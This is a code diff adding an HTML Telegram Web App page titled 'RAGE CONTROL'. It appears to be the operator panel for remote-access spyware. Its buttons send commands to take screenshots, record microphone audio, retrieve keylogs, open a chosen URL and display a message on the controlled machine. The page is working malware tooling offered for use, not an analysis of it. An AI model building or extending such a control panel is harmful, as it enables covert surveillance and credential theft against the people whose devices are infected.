@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #0f0f0f; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .btn { background: #1a1a1a; border: 1px solid #00ff00; color: #00ff00; padding: 15px; margin: 10px; width: 80%; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #00ff00; color: #000; }
+        input { background: #1a1a1a; border: 1px solid #333; color: white; padding: 10px; width: 80%; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <h1>RAGE CONTROL</h1>
+    
+    <button class="btn" onclick="send('scr')">📸 СДЕЛАТЬ СКРИНШОТ</button>
+    <button class="btn" onclick="send('mic')">🎤 ЗАПИСЬ ЗВУКА</button>
+    <button class="btn" onclick="send('keylog')">⌨️ ПОЛУЧИТЬ ЛОГИ</button>
+    
+    <hr>
+    
+    <input id="url" placeholder="https://google.com">
+    <button class="btn" onclick="openUrl()">🌐 ОТКРЫТЬ ССЫЛКУ</button>
+    
+    <input id="msg" placeholder="Привет, я тут!">
+    <button class="btn" onclick="sendMsg()">💬 ВЫВЕСТИ ТЕКСТ</button>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        function send(command) {
+            tg.sendData(command);
+        }
+
+        function openUrl() {
+            let url = document.getElementById('url').value;
+            tg.sendData('open|' + url);
+        }
+
+        function sendMsg() {
+            let msg = document.getElementById('msg').value;
+            tg.sendData('msg|' + msg);
+        }
+    </script>
+</body>
+</html>
